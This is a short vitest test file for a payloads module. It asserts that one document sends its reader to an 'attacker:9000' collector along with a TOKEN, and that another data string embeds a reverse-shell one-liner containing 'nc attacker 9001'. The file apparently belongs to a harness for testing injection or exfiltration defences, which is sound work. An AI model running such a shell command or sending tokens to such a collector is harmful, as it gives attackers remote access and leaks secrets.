import { describe, expect, it } from "vitest";
import {
  EXFIL_DOCUMENT,
  RCE_DATA,
  REVERSE_SHELL_ONELINER,
} from "./payloads.js";

describe("payloads", () => {
  it("EXFIL_DOCUMENT points the reader at the attacker collector", () => {
    expect(EXFIL_DOCUMENT).toContain("attacker:9000");
    expect(EXFIL_DOCUMENT).toContain("TOKEN");
  });

  it("RCE_DATA embeds the exact reverse-shell one-liner", () => {
    expect(RCE_DATA).toContain(REVERSE_SHELL_ONELINER);
    expect(RCE_DATA).toContain("nc attacker 9001");
  });
});
